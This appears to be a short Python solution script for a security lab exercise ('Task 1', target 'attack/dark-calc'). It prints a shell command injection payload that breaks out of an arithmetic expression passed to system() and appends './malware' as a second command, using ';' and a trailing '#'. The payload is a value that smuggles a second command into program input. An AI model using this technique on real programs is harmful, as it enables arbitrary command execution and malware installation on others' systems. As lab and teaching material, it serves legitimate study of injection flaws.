#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

The program wraps input as system("echo $((" + input + "))"). We close the
arithmetic early with "1))" and append ./malware as a real shell command,
using ';' and a trailing '#' comment to swallow the appended "))".
"""
import sys

payload = b"1));./malware;#"

sys.stdout.buffer.write(payload)
